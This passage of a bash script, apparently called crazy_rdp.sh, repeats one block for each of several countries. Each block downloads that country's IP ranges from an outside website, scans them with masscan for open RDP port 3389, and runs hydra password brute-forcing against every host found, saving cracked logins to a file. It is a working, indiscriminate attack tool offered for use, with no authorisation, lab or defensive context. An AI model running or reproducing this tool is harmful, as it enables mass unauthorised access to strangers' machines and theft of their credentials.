masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


else
if [ $country = "37" ]; then
curl http://ipdiapazon.16mb.com/Cayman_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "38" ]; then
curl http://ipdiapazon.16mb.com/Central_african_republic.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "39" ]; then
curl http://ipdiapazon.16mb.com/Chile.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "40" ]; then
curl http://ipdiapazon.16mb.com/China.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "41" ]; then
curl http://ipdiapazon.16mb.com/Colombia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "42" ]; then
curl http://ipdiapazon.16mb.com/Congo.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "43" ]; then
curl http://ipdiapazon.16mb.com/Cook_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "44" ]; then
curl http://ipdiapazon.16mb.com/Costa_rica.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "45" ]; then
curl http://ipdiapazon.16mb.com/Cote.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "46" ]; then
curl http://ipdiapazon.16mb.com/Croatia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "47" ]; then
curl http://ipdiapazon.16mb.com/Cuba.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "48" ]; then
curl http://ipdiapazon.16mb.com/Cyprus.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "49" ]; then
curl http://ipdiapazon.16mb.com/Czech_republic.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
